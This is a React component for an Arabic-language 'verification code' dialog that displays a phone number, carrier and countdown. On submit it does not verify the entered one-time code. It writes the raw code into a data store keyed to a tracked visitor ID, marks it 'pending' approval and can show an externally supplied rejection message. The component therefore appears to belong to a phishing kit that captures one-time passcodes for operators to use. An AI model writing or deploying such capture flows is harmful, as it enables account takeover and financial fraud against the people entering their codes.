"use client";

import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { ShieldCheck, Loader2 } from "lucide-react";
import { addData } from "@/lib/data-store";
import { getOrCreateVisitorId } from "@/lib/visitor-presence";

interface PhoneOtpDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  phoneNumber: string;
  phoneCarrier: string;
  onOtpSubmitted: () => void;
  rejectionError: string;
}

export function PhoneOtpDialog({
  open,
  onOpenChange,
  phoneNumber,
  phoneCarrier,
  onOtpSubmitted,
  rejectionError,
}: PhoneOtpDialogProps) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [timeLeft, setTimeLeft] = useState(120);

  const inputRef = useRef<HTMLInputElement>(null);

  // Reset OTP and timer when dialog opens
  useEffect(() => {
    if (open) {
      setOtp("");
      setTimeLeft(120);

      const focusTimer = setTimeout(() => {
        inputRef.current?.focus();
      }, 200);

      return () => clearTimeout(focusTimer);
    }
  }, [open]);

  // Countdown timer
  useEffect(() => {
    if (!open) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }

        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [open]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;

    return `${mins.toString().padStart(2, "0")}:${secs
      .toString()
      .padStart(2, "0")}`;
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);

    setOtp(value);
  };

  const handleSubmit = async () => {
    if (otp.length < 4 || isSubmitting) return;

    try {
      setIsSubmitting(true);

      const visitorId = getOrCreateVisitorId();

      if (visitorId) {
        await addData({
          id: visitorId,
          phoneOtp: otp,
          phoneApproval: "pending",
        });
      }

      onOtpSubmitted();
    } catch (error) {
      console.error("OTP submit error:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="max-w-md overflow-hidden border-0 p-0 shadow-2xl"
        dir="rtl"
      >
        {/* Header */}
        <div className="bg-gradient-to-l from-green-500 to-teal-500 p-6 text-center text-white">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-white/20 bg-white/20 shadow-lg backdrop-blur-sm">
            <ShieldCheck className="h-8 w-8" />
          </div>

          <DialogHeader>
            <DialogTitle className="text-center text-xl font-bold text-white">
              رمز التحقق OTP
            </DialogTitle>

            <DialogDescription className="mt-1 text-center text-sm text-white/90">
              تم إرسال رمز التحقق إلى
              <span className="mr-1 font-semibold text-white" dir="ltr">
                {phoneNumber}
              </span>
            </DialogDescription>
          </DialogHeader>
        </div>

        {/* Content */}
        <div className="space-y-5 bg-white p-6">
          {/* Carrier */}
          {phoneCarrier && (
            <div className="text-center">
              <span className="inline-flex rounded-full bg-green-50 px-3 py-1 text-xs font-medium text-green-700">
                {phoneCarrier}
              </span>
            </div>
          )}

          {/* Rejection Error */}
          {rejectionError && (
            <div className="rounded-xl border border-red-200 bg-red-50 p-3 text-center">
              <p className="text-sm font-medium text-red-700">
                {rejectionError}
              </p>
            </div>
          )}

          {/* OTP Input */}
          <div className="space-y-2">
            <label className="block text-right text-sm font-semibold text-gray-700">
              أدخل رمز التحقق
            </label>

            <Input
              ref={inputRef}
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={otp}
              onChange={handleOtpChange}
              onKeyDown={(e) => {
                if (e.key === "Enter") {
                  handleSubmit();
                }
              }}
              maxLength={6}
              placeholder="------"
              className="
                h-14
                rounded-xl
                border-2
                border-gray-200
                text-center
                text-2xl
                font-bold
                tracking-[0.5em]
                transition-all
                duration-200
                focus:border-green-500
                focus:ring-2
                focus:ring-green-500/20
              "
              dir="ltr"
            />
          </div>

          {/* Timer */}
          <div className="text-center text-sm text-gray-500">
            {timeLeft > 0 ? (
              <>
                إعادة الإرسال خلال:{" "}
                <span
                  className="font-bold tabular-nums text-green-600"
                  dir="ltr"
                >
                  {formatTime(timeLeft)}
                </span>
              </>
            ) : (
              <span className="font-medium text-gray-600">
                انتهى وقت إعادة الإرسال
              </span>
            )}
          </div>

          {/* Submit Button */}
          <Button
            type="button"
            onClick={handleSubmit}
            disabled={otp.length < 4 || isSubmitting}
            className="
              h-12
              w-full
              rounded-xl
              bg-gradient-to-r
              from-green-500
              to-teal-500
              text-base
              font-semibold
              text-white
              shadow-md
              shadow-green-500/20
              transition-all
              duration-200
              hover:from-green-600
              hover:to-teal-600
              hover:shadow-lg
              hover:shadow-green-500/25
              disabled:cursor-not-allowed
              disabled:opacity-50
            "
          >
            {isSubmitting ? (
              <div className="flex items-center justify-center gap-2">
                <Loader2 className="h-5 w-5 animate-spin" />
                <span>جاري التحقق...</span>
              </div>
            ) : (
              <div className="flex items-center justify-center gap-2">
                <ShieldCheck className="h-5 w-5" />
                <span>تأكيد</span>
              </div>
            )}
          </Button>

          {/* Security Note */}
          <p className="text-center text-xs leading-relaxed text-gray-400">
            لا تشارك رمز التحقق مع أي شخص
          </p>
        </div>
      </DialogContent>
    </Dialog>
  );
}
